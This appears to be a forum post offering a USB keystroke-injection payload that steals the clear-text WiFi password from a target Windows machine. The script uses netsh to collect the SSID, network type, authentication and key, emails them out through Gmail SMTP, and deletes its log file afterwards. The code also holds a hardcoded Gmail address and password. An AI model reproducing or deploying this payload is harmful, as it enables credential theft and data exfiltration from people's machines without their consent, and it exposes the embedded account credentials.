This payload:

    Opens CMD
    Finds the key (password) of the WiFi the target is connected to
    Saves the SSID, Network type, Authentication and the key to Log.txt
    And emails Log.txt via gmail

Change the following things;

    ACCOUNT: Your gmail account
    PASSWORD: Your gmail password
    RECEIVER: The email you want to send Log.txt to

If you have any suggestions please tell me.
Code:

REM Author: Siem  
REM Version: 1  
REM Description: Clear text WiFi key grabber  
```
DELAY 2000
WINDOWS d
REM --> Open cmd
WINDOWS r
DELAY 500
STRING cmd
ENTER
DELAY 1000
REM --> Change directory (you can change this to something else to make less visible)
STRING cd "%USERPROFILE%\Desktop"
ENTER
REM --> Get SSID
STRING for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "B"') do set SSID=%A
ENTER
REM --> Get network type
STRING netsh wlan show profiles %SSID% | findstr "Network type" | findstr /v "broadcast" | findstr /v "Radio">Temp.txt
ENTER
STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" Temp.txt') do set NETTYPE=%A
ENTER
REM --> Get authentication
STRING netsh wlan show profiles %SSID% | findstr "Authentication">Temp.txt
ENTER
STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" Temp.txt') do set AUTH=%A
ENTER
REM --> Get key
STRING netsh wlan show profiles %SSID% key=clear | findstr "Key Content">Temp.txt
ENTER
STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" Temp.txt') do set KEY=%A
ENTER
REM --> Delete Temp.txt
STRING del Temp.txt
ENTER
REM --> Create Log.txt
STRING echo SSID: %SSID%>>Log.txt & echo Network type: %NETTYPE%>>Log.txt & echo Authentication: %AUTH%>>Log.txt & echo Password: %KEY%>>Log.txt
ENTER
REM --> Mail Log.txt
STRING powershell
ENTER
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('earlreallong99@gmail.com', 'Tempy22Lily');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'earlreallong99@gmail.com'
ENTER
STRING $ReportEmail.To.Add('reallong99@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'WiFi'
ENTER
STRING $ReportEmail.Body = 'The log is attached!' 
ENTER
STRING $ReportEmail.Attachments.Add('Log.txt')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
STRING exit
ENTER
REM --> Delete Log.txt and exit
STRING del Log.txt & exit
ENTER
```